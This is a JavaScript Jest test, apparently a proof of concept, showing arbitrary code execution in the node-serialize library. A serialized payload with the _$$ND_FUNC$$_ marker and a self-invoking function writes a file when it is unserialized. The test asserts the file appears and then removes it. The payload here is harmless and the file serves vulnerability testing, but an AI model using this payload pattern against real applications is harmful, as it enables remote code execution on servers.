const v19 = () => {
    const v11 = expect.assertions(2);
    v11;
    const fs = require('fs');
    const serialize = require('node-serialize');
    const path = './node-serialize';
    let payload = '{"rce":"_$$ND_FUNC$$_function (){require(`fs`).writeFileSync(`node-serialize`,``);}()"}';
    file_exist = fs.existsSync(path);
    const v12 = expect(file_exist);
    const v13 = v12.toBe(false);
    v13;
    try {
        const v14 = serialize.unserialize(payload);
        v14;
    } catch (error) {
    }
    file_exist = fs.existsSync(path);
    const v15 = expect(file_exist);
    const v16 = v15.toBe(true);
    v16;
    const v17 = function (err) {
    };
    const v18 = fs.unlink(path, v17);
    v18;
};
const v20 = test('Arbitrary code execution in node-serialize', v19);
v20;